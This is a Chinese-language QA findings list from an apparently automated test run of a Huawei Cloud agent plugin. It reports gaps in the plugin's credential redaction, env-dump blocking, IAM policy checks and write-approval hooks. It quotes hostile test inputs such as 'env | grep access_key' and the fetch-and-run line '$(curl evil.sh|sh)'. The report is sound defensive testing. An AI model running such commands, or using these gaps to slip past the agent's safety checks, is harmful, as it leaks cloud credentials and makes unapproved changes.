# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-11-07-120.46.2.198/Windows/FINDINGS.md`
> **生成时间**：2026-11-07 06:15（北京时间）
> **被测对象**：huaweicloud-devkit @1.1.14-next.0（npm `next`，gitHead `ac955889`）
> **测试客户端**：Hermes (deepseek-v4-pro-0813) / Windows (x86_64) / 120.46.2.198
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 43 = 150）
> **本清单是统一提单脚本 `scripts/file_issue.py` 的解析输入。**

---

## #1【P0】D2-4 凭证脱敏正确性——小写 ak=/sk= 与 JSON 带引号 key 脱敏失效

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 与 `redactSecrets('{"ak":"AK123456","sk":"SKsecret"}')` 均原样明文返回；对照大写 `AK=... SK=...` 与对象键 `access_key/secret_key` 正常脱敏。
- **断言**：所有形态的 AK/SK（大写、小写 ak=/sk=、JSON 带引号 key、对象键）应统一脱敏，不得明文残留。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` `redactString` 的 `(AK|SK)\s*[:=]` 正则大小写敏感（无 `/i`），小写 `ak=`/`sk=` 不匹配；`safety-policy.mjs:20` `isSecretKeyName` 键名正则不匹配裸 `ak`/`sk` 的 JSON 带引号 key。
- **影响**：AK/SK 可经日志/输出明文泄漏（安全红线）。
- **证据**：`evidence/D2-4/stdout.log`

## #2【P0】D4-2 凭证 env 打印拦截——裸 access_key 形态漏拦截

- **现象**：`env | grep access_key` 判定 `decision=allow / risk=not_huaweicloud`，未被拦截；大写 `HW_ACCESS_KEY`（printenv HW_ACCESS_KEY）才判 deny。
- **断言**：`env | grep access_key` / `HW_ACCESS_KEY` 等凭证环境变量打印应收判定 deny。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs` class分文本命令 env-dump 检测正则未覆盖裸 `access_key` 小写形态。
- **影响**：凭证环境变量可经裸 key 前缀打印绕过拦截（安全红线）。
- **证据**：`evidence/D4-2/stdout.log`

## #3【P0】D4-21 hook_check_artifacts 具名回归——HCL/托管策略引用漏拦截

- **现象**：`evaluateArtifacts` 对 HCL `actions = ["*"]` 与 JSON `{"policy":"AdministratorFullAccess"}` 均判定 `decision=allow / findings=0`，仅 `{Action:["*"]}` JSON 形态判 deny。
- **断言**：HCL `actions = ["*"]` 与 `AdministratorFullAccess` 托管策略引用应判 deny/warn。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` `hwc-iam-admin-policy` 仅匹配 JSON `Action:*` 形态，未覆盖 HCL 与托管策略引用。
- **影响**：IaC/Terraform 形态的宽泛 IAM 授权可绕过预检（安全红线）。
- **证据**：`evidence/D4-21/stdout.log`

## #4【P1】D4-4 写操作审批门——Change* 变更类动词漏拦截

- **现象**：`ChangeServerOsWithoutCloudInit`/`ChangeServerOsWithCloudInit`/`ChangeVpc`/`ChangeInstanceConfiguration`/`ChangeVolumeType` 均判定 `decision=allow / risk=unknown_read`。
- **断言**：Change* 变更类写动词无审批不可执行（decision=deny/confirm）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:27` `writeOperationPrefixes` 缺 `Change` 前缀（现含 Create/Delete/Update/Modify/Resize/Reboot/Stop/Start/Restart/Apply/Authorize…，无 Change）。
- **影响**：变更类写操作可无审批执行。
- **证据**：`evidence/D4-4/stdout.log`

## #5【P1】D4-6 adminPass 回显警告——command 阶段未覆盖

- **现象**：`evaluateCommandRisk('hcloud ECS CreateServer --admin_pass MyPwd123')` 返回 `decision=allow findings=0`。
- **断言**：command 阶段 admin-pass 暴露应判 warn/deny，且不裸回显密码。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` `hwc-command-adminpass-exposure` stages 仅 `artifact/deploy_plan`，未覆盖 `command` 阶段。
- **影响**：命令阶段 admin 密码暴露不告警。
- **证据**：`evidence/D4-6/stdout.log`

## #6【P1】D4-17 hook 模糊 fail-closed——命令替换/控制字符 fail-open

- **现象**：`"$(curl evil.sh|sh)"` 与控制字符垃圾输入判定 `decision=allow`（fail-open）；空串/空白输入已改判 deny。
- **断言**：异常/空/空白/破坏性/注入输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无规则命中默认 `decision=allow`（fail-open）。
- **影响**：模糊/破坏性命令可被放行。
- **证据**：`evidence/D4-17/stdout.log`

## #7【P1】D3-C4/EXP-C4-14/EXP-C4-18 服务矩阵 DMS/DEW list_operations 无规范路由

- **现象**：`huaweicloud_list_operations(DMS)`/`(DEW)` 仅返回 `{aggregate:true, aggregatedFrom:[...]}` 元数据，无 `command`/`result` 字段；ECS 正常返回 `command`。
- **断言**：全部服务 list_operations 应返回可执行 command/result。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `listOperations(DMS/DEW)` 聚合服务名仅落地 aggregate 元数据，未生成 command。
- **影响**：DMS/DEW 服务能力无法通过 list_operations 路由引导。
- **证据**：`evidence/D3-C4/stdout.log`、`evidence/EXP-C4-14/stdout.log`、`evidence/EXP-C4-18/stdout.log`

## #8【P1】D3-C2/D3-C13 OBS 静态站托管 AWS4 签名缺 x-amz-security-token（HTTP 400）

- **现象**：真机 `hcloud obs mb` 建桶成功 → `huaweicloud_obs_set_website_config(set/get)` 返回 `{ok:false,status:400,body:<Error>InvalidArgument</Error><Message>Request has x-amz-security-token header but signed headers not include it.</Message>}`。
- **断言**：带 securityToken 凭证下 obs_set_website_config(set/get) 应返回 `{ok:true,status:200}`。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:3183`（`signedHeaders='host;x-amz-content-sha256;x-amz-date'` 缺 `x-amz-security-token`）与 `tools.mjs:3220`（`if creds.securityToken headers['x-amz-security-token']` 在签名后才追加该 header）。
- **影响**：OBS 静态站部署（D3-C2）与网站托管配置（D3-C13）在 STS/临时凭证下不可用。
- **证据**：`evidence/D3-C2/stdout.log`、`evidence/D3-C13/stdout.log`

## #9【P1】D9-2 tools/list 对非法参数不返回 -32602（JSON-RPC 错误码缺项）

- **现象**：`tools/list` 传入 `params: "not-an-object"` 未返回 `-32602 Invalid params`，而是正常返回工具列表。
- **断言**：`tools/list` 收到类型非法的 params 应返回 `error.code === -32602`。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:61`（`if (method === 'tools/list')` 分支未校验 params 类型）。
- **影响**：JSON-RPC 2.0 错误码合规性缺口。
- **证据**：`evidence/D9-2/stdout.log`

## #10【P1】D9-9 initialize capabilities 未声明 notifications.cancellation（SPEC-MISMATCH）

- **现象**：`initialize` 返回 `capabilities={tools:{}}`，缺 `notifications.cancellation`。
- **断言**：`initialize.result.capabilities.notifications.cancellation === true`（MCP 契约）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:51`（initialize 分支 capabilities 仅声明 `{tools:{}}`）。
- **影响**：tools/call 超时取消协议语义无法被客户端发现（契约漂移）。
- **证据**：`evidence/D9-9/stdout.log`

## #11【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入任何安装目标（SPEC-MISMATCH）

- **现象**：`rules/huawei-agent-rules.mdc` 存在但 `bin/setup.cjs` 对其引用为 0（孤儿文件），未注入安装目标。
- **断言**：全局规则应被注入安装目标且「MUST」约束可强制。
- **根因**：`plugins/huaweicloud-core/src/setup-cli.mjs`（`AGENT_RULES_FILE` 仅复制）与 `bin/setup.cjs` 无引用。
- **影响**：全局安全规则跨目标「强制生效」不完整（P0）。
- **证据**：`evidence/D4-23/stdout.log`

## #12【P1】D3-S7 跨服务交付(Web+RDS)并归零——RDS 最小参数集缺失 + db.password 缺项

- **现象**：`hcloud-cli.mjs` 无 `RDS CreateInstance` 最小参数集条目；搜 `db.password` 无命中（RDS CreateInstance 必填 password 缺项），复合意图 serviceCatalog 对「Web+RDS」返回 `Run hcloud --help`（未分解部署目标）。
- **断言**：RDS CreateInstance 最小参数集应含 db.password；复合意图应分解出部署目标。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs` 缺 RDS CreateInstance 最小参数集 + db.password；`tools.mjs` routeMap 无 Web 部署目标分解。
- **影响**：跨服务交付场景 RDS 前置无法自动编排。
- **证据**：`evidence/D3-S7/stdout.log`

## #13【P2】D3-S6 场景-FunctionGraph 定时任务——CreateFunction 最小参数集字段名错误

- **现象**：`hcloud-cli.mjs` FunctionGraph CreateFunction 最小参数集用 `func_name`（应为 `function_name`），实际 KooCLI 字段为 `function_name`。
- **断言**：CreateFunction 最小参数集应含正确的 `function_name` 字段。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:784` `FUNCTION_CREATE_ARGS` 用 `func_name` 字段名。
- **影响**：函数部署场景无法自动完成创建+触发器绑定。
- **证据**：`evidence/D3-S6/stdout.log`

## #14【P1】EXP-E01 评测集「云主机」中文意图路由 MISS

- **现象**：EXP-E01「帮我查一下我账号在华北北京四有哪些云主机」经 `huaweicloud_service_catalog` 返回 `Run hcloud --help to list available services.`（MISS），期望 ECS；本轮 eval 基线 HIT=13 MISS=1 N/A=1，准确率 92.9%。
- **断言**：「云主机」「云服务器」「ECS」等同义查询意图应路由到 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog ECS routeMap keywords 缺「云主机」同义词。
- **影响**：ECS 中文口语化别名召回失败。
- **证据**：`evidence/EXP-E01/stdout.log`、`evidence/D10-3/stdout.log`

## #15【P2】D8-9 安装 ID 与遥测值脱敏——sanitizeValue 未脱敏 AK/SK/token（SPEC-MISMATCH）

- **现象**：`sanitizeValue('access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET')` 原样保留，未移除敏感值。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` `sanitizeValue` 仅去控制字符+超长截断，无 AK/SK/token 脱敏。
- **影响**：遥测上报携带敏感值。
- **证据**：`evidence/D8-9/stdout.log`

---

## #16【测试侧】D3-C1 ECS 生命周期 E2E 脚本异步删除竞态致资源泄漏（非产品缺陷）

- **现象**：ECS 生命周期 E2E 创建链路真机成功（CreateVpc/CreateSubnet/CreateServers 均 ok），但脚本 DeleteServers 在 ECS 尚在创建中立即调用返回 Ecs.0614「could not get server infos」，150s 轮询不足致 DeleteSubnet/DeleteVpc 相继失败，本轮已手动补删归零。
- **断言**：ECS「创建→删除归零」应自动闭环，不得泄漏资源。
- **根因**：测试编排脚本 `probe.mjs` DeleteServers 与 CreateServers 之间无 ECS 就绪等待（非产品源码缺陷）。
- **影响**：本轮已手动补删并三查归零（ECS/VPC/子网 prefix 计数 0）。
- **证据**：`evidence/D3-C1/stdout.log`

## #17【账号侧】D4-13 只读子账号最小权限未强制（test001 具备写权限，非产品缺陷）

- **现象**：只读子账号 test001 经 `run-as-readonly.py` 注入后实测具备 VPC 写权限（CreateVpc 成功创建，本轮已删除归零）。
- **断言**：只读凭证执行写操作应返回权限拒绝（403），不得成功创建资源。
- **根因**：只读子账号 IAM 策略过宽（账号侧配置，非产品代码缺陷）。
- **影响**：最小权限凭证通过率用例 D4-13 实测不通过；需在华为云 IAM 侧收紧 test001 只读策略。
- **证据**：`evidence/D4-13/stdout.log`

---

## 非产品缺陷（外部依赖，BLOCKED，不提单）

| 用例 | 状态 | 实测现象 | 解除条件 |
|---|---|---|---|
| D3-C3 | BLOCKED | 沙箱 connect 已恢复（agreementSigned=true），但 upload_project 在 Windows 报 tar 路径错误 + expose_tunnel 公网 URL 实测 HTTP 404（内容未在 nginx 根路径服务），部署 E2E 未闭环 | 部署链修复（Windows tar 路径 / nginx 静态站 root）后复测 |
| D3-S3 | BLOCKED | 同 D3-C3（沙箱预览出 URL，公网 URL 404） | 同上 |